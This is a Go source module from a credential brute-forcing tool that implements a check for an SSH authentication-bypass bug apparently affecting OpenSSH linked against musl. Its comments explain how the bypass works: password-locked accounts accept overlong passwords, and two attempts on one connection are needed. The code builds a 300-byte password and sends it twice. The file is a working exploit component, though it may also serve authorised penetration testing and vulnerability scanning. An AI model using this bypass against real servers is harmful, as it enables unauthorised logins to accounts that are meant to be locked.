package modules

import (
	"context"
	"strings"
	"time"

	"github.com/vflame6/bruter/utils"
	"golang.org/x/crypto/ssh"
)

// SSHHoleProbePassword returns a representative password accepted by the
// sshhole OpenSSH/musl bug. The vulnerable path accepts passwords from 257 to
// 1024 bytes for accounts whose shadow field is "*"; 300 bytes stays within
// that range while leaving room below the server's maximum.
func SSHHoleProbePassword() string {
	return strings.Repeat("A", 300)
}

// SSHHoleHandler checks the sshhole password-length bypass using SSH password
// authentication. The vulnerable OpenSSH path needs two password attempts on
// one connection: the first primes its cached fake salt and the second triggers
// musl's overlong-password behavior.
func SSHHoleHandler(ctx context.Context, dialer *utils.ProxyAwareDialer, timeout time.Duration, target *Target, credential *Credential) (bool, error) {
	auth := ssh.RetryableAuthMethod(ssh.Password(credential.Password), 2)
	return sshAuthHandler(ctx, dialer, timeout, target, credential, auth)
}
